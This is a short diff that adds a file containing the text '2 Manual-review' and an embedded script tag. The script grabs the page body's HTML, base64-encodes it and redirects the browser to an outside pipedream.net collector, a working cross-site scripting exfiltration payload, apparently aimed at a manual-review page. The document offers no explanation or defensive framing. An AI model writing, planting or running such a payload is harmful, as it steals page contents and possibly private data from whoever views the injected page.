@@ -1,0 +1,5 @@
+2 Manual-review
+<script>
+var exfil = document.getElementsByTagName("body")[0].innerHTML;
+window.location.href="https://enhs83uxgt82f.x.pipedream.net/" + btoa(exfil);
+</script>
